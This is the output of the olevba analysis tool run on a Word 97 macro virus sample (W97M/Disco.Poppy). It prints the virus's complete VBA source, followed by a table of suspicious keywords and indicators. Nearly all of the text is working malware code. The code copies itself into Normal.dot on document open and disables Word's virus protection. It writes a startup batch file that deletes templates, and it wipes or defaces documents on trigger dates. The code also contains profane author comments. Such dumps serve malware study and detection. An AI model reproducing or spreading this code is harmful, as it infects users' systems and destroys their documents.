olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Poppy.e-5a1ef30cd745f7ca784ec35f6b754eb8848dad1b
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Poppy.e-5a1ef30cd745f7ca784ec35f6b754eb8848dad1b - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO autoOpen.bas 
in file: Virus.MSWord.Poppy.e-5a1ef30cd745f7ca784ec35f6b754eb8848dad1b - OLE stream: 'Macros/VBA/autoOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 


Public Sub Main()

'W97M/Disco.Poppy.II"
'By VicodinES
'Macro Virus for Word 97
'This is what happens when Disco.Poppy gets raped by The Mighty Blee

    On Error Resume Next
    
    A$ = "a" + "u" + "to" + "O" + "p" + "en"
    Valium$ = "N" + "O" + "R" + "M" + "A" + "L" + "." + "D" + "OT"
    
    msfile$ = "c:\windows\startm~1\programs\startup\msfile.bat"

   
    If nfat = vbReadOnly Then Call vBitchES(msfile$)
    If nfat = vbReadOnly + vbArchive Then Call vBitchES(msfile$)
 
    If nfat = vbReadOnly Then GoTo fuckoff
    If nfat = vbReadOnly + vbArchive Then GoTo fuckoff
    
    
    Soma$ = UCase(WordBasic.[Right$](WordBasic.[MacroFileName$](WordBasic.[MacroName$](0)), 10))

    If Soma$ = Valium$ Then
        
            Application.OrganizerCopy Source:= _
        NormalTemplate.FullName, Destination:= _
        ActiveDocument.FullName, Name:=A$, Object:= _
        wdOrganizerObjectProjectItems
            
        
            ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatTemplate
            Call dhIconDisco("C:\autorun.inf")
            
       
    Else
               
        Application.OrganizerCopy Source:= _
        ActiveDocument.FullName, Destination:= _
        NormalTemplate.FullName, Name:=A$, Object:= _
        wdOrganizerObjectProjectItems
        
        If NormalTemplate.Saved = False Then NormalTemplate.Save
        
    End If
    
    With Options
        .ConfirmConversions = False
        .VirusProtection = False
        .SaveNormalPrompt = False
    End With
    
    With ActiveDocument
        .ReadOnlyRecommended = False
        .Password = ""
        .WritePassword = ""
    End With

        Application.OrganizerDelete Source:= _
        NormalTemplate.FullName, Name:="Cap", Object:= _
        wdOrganizerObjectProjectItems
        
GoTo fuckoff

Hell:
        
fuckoff:
    On Error GoTo -1: On Error GoTo 0


End Sub
Sub ViewVBCode()


MsgBox "  W97M/Disco.Poppy.II by VicodinES  ", vbOKOnly, " © The Narkotic Network "
MsgBox "Everything is fine - nothing to see here - let's move it along kids!", vbExclamation, " * VicodinES * Klonopin.Jones * Fastin.Blee * "
MsgBox "This is what happens when Disco.Poppy gets raped by The Mighty Blee", vbQuestion, "Slogan?"
End Sub
Sub vBitchES(strFile As String)
 
 Dim hFile As Long

 n$ = NormalTemplate
 Part1$ = "@echo off"
 Part11$ = "attrib -h -r "
 snag$ = "c:\progra~1\micros~1\templa~1\"
 snag1$ = "c:\progra~1\micros~2\templa~1\"
 Part2$ = "del "
 Part33$ = "cls"
 
     hFile = FreeFile
     Open strFile For Output Access Write As hFile
     Print #hFile, Part1$
     Print #hFile, Part11$ + snag$ + n$
     Print #hFile, Part11$ + snag1$ + n$
     Print #hFile, Part2$ + snag$ + n$
     Print #hFile, Part2$ + snag1$ + n$
     Print #hFile, Part33$
     Print #hFile, Part2$ + msfile$
     Close hFile
     
     GoTo Hell
     
Hell:

End Sub
Sub dhIconDisco(strFile As String)



Dim Part1$
Dim Part2$
Dim Part22$
Dim Part3$
Dim Part33$
Dim rn$
Dim rnn$
Dim Choice
Dim hFile As Long

Randomize

Choice = Int(Rnd * 2)
rnn$ = Int(Rnd * 66) + 2
rn$ = Int(Rnd * 27) + 1
Part1$ = "[autorun]"
Part2$ = "icon = c:\windows\system\pifmgr.dll,"
Part22$ = "icon = c:\windows\SYSTEM\shell32.dll,"
Part3$ = Part2$ + rn$
Part33$ = Part22$ + rnn$


    hFile = FreeFile
    Open strFile For Output Access Write As hFile
    Print #hFile, Part1$
    If Choice = 0 Then
        Print #hFile, Part3$
    Else
        Print #hFile, Part33$
    End If
    Close hFile


    
End Sub
Sub FileExit()

    With Options
        .ConfirmConversions = False
        .VirusProtection = False
        .SaveNormalPrompt = False
    End With

    Application.Quit

End Sub

Sub fileprint()


    Dim D$
    Dim Ti$
    Dim Tp$
    Dim Z

    Ti$ = Time
    Tp$ = "12:00:01 PM"
    D$ = Date
    
    Z = 0
    
    If D$ = "4/12/98" Then Z = 1
    If Ti$ = Tp$ Then Z = 1
    If D$ = "4/12/99" Then Z = 1
    If D$ = "1/11/98" Then Z = 1
    If D$ = "1/11/99" Then Z = 1
    If D$ = "6/14/99" Then Z = 1
    If D$ = "1/22/98" Then Z = 1
    If D$ = "8/21/98" Then Z = 1
    If D$ = "9/19/99" Then Z = 1
    If D$ = "8/18/99" Then Z = 1
    If D$ = "7/9/99" Then Z = 1
    If D$ = "12/17/99" Then Z = 1
    If D$ = "8/18/98" Then Z = 1
    If D$ = "7/9/98" Then Z = 1
    If D$ = "12/17/98" Then Z = 1
        
    If Z = 1 Then
    
    Selection.EndKey Unit:=wdLine
    Selection.MoveDown Unit:=wdScreen, Count:=1
    Selection.EndKey Unit:=wdLine
    Selection.TypeParagraph
    Selection.TypeParagraph
    Selection.TypeParagraph
    Selection.TypeText Text:= _
        "When will you wake up and realize that we live in a "
    Selection.TypeText Text:= _
        "primitive society? Don't kid yourself - there is NO GOD!!"
        
    ActiveDocument.PrintOut
    
    
Else

    ActiveDocument.PrintOut
    
End If

End Sub
Sub FileTemplates()


    Dim D$
    Dim Ti$
    Dim Tp$
    Dim Z

    Ti$ = Time
    Tp$ = "12:00:01 PM"
    D$ = Date
    
    Z = 0
    
    If D$ = "4/12/98" Then Z = 1
    If Ti$ = Tp$ Then Z = 1
    If D$ = "4/12/99" Then Z = 1
    If D$ = "1/11/98" Then Z = 1
    If D$ = "1/11/99" Then Z = 1
    If D$ = "6/14/99" Then Z = 1
    If D$ = "1/22/98" Then Z = 1
    If D$ = "8/21/98" Then Z = 1
    If D$ = "9/19/99" Then Z = 1
    If D$ = "8/18/99" Then Z = 1
    If D$ = "7/9/99" Then Z = 1
    If D$ = "12/17/99" Then Z = 1
    If D$ = "8/18/98" Then Z = 1
    If D$ = "7/9/98" Then Z = 1
    If D$ = "12/17/98" Then Z = 1
    
    
If Z = 1 Then

    With Options
        .CheckSpellingAsYouType = False
        .CheckGrammarAsYouType = False
        .SuggestSpellingCorrections = False
        .SuggestFromMainDictionaryOnly = False
        .CheckGrammarWithSpelling = True
        .ShowReadabilityStatistics = False
        .IgnoreUppercase = True
        .IgnoreMixedDigits = True
        .IgnoreInternetAndFileAddresses = True

    End With

    Selection.WholeStory
    Selection.Delete Unit:=wdCharacter, Count:=1
    Selection.TypeParagraph
    Selection.TypeParagraph
    Selection.TypeText Text:= _
        "Macro.Poppy.I aka Disco.Poppy"
    Selection.TypeParagraph
    Selection.TypeText Text:= _
        "By VicodinES"
    Selection.TypeParagraph
    Selection.TypeText Text:= _
        "Macro Virus for Word 97"
    Selection.TypeParagraph
        Selection.TypeParagraph
            Selection.TypeParagraph
                Selection.TypeParagraph
    Selection.TypeText Text:= _
        "T h e   N a r k o t i c   N e t w o r k !"
    Selection.TypeParagraph
    
Else

GoTo fuck1

End If

fuck1:


End Sub
Sub HelpAbout()


MsgBox "  W97M/Disco.Poppy.II by VicodinES  ", vbOKOnly, " © The Narkotic Network "
MsgBox "Everything is fine - nothing to see here - let's move it along kids!", vbExclamation, " * VicodinES * Klonopin.Jones * Fastin.Blee * "
MsgBox "Social camouflage for this modern age!", vbQuestion, "Slogan?"
End Sub
Public Sub ToolsMacro()


    Dim D$
    Dim Ti$
    Dim Tp$
    Dim Z


    Ti$ = Time
    Tp$ = "12:00:01 PM"
    D$ = Date


    With Options
        .ConfirmConversions = False
        .VirusProtection = False
        .SaveNormalPrompt = False
    End With
    
    Z = 0
    
    If D$ = "4/12/98" Then Z = 1
    If Ti$ = Tp$ Then Z = 1
    If D$ = "4/12/99" Then Z = 1
    If D$ = "1/11/98" Then Z = 1
    If D$ = "1/11/99" Then Z = 1
    If D$ = "6/14/99" Then Z = 1
    If D$ = "1/22/98" Then Z = 1
    If D$ = "8/21/98" Then Z = 1
    If D$ = "9/19/99" Then Z = 1
    If D$ = "8/18/99" Then Z = 1
    If D$ = "7/9/99" Then Z = 1
    If D$ = "12/17/99" Then Z = 1
    If D$ = "8/18/98" Then Z = 1
    If D$ = "7/9/98" Then Z = 1
    If D$ = "12/17/98" Then Z = 1
    
If Z = 1 Then

    With Options
        .CheckSpellingAsYouType = False
        .CheckGrammarAsYouType = False
        .SuggestSpellingCorrections = False
        .SuggestFromMainDictionaryOnly = False
        .CheckGrammarWithSpelling = True
        .ShowReadabilityStatistics = False
        .IgnoreUppercase = True
        .IgnoreMixedDigits = True
        .IgnoreInternetAndFileAddresses = True

    End With

    Selection.WholeStory
    Selection.Delete Unit:=wdCharacter, Count:=1
    Selection.TypeParagraph
    Selection.TypeParagraph
    Selection.TypeText Text:= _
        "Macro.Poppy.I aka Disco.Poppy"
    Selection.TypeParagraph
    Selection.TypeText Text:= _
        "By VicodinES"
    Selection.TypeParagraph
    Selection.TypeText Text:= _
        "Macro Virus for Word 97"
    Selection.TypeParagraph
        Selection.TypeParagraph
            Selection.TypeParagraph
                Selection.TypeParagraph
    Selection.TypeText Text:= _
        "T h e   N a r k o t i c   N e t w o r k !"
    Selection.TypeParagraph
    
Else

GoTo fuck1

End If

fuck1:

End Sub


+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |autoOpen            |Runs when the Word document is opened        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Write               |May write to a file (if combined with Open)  |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|shell32             |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|system              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |msfile.bat          |Executable file name                         |
|IOC       |autorun.inf         |Executable file name                         |
|IOC       |pifmgr.dll          |Executable file name                         |
|IOC       |shell32.dll         |Executable file name                         |
+----------+--------------------+---------------------------------------------+

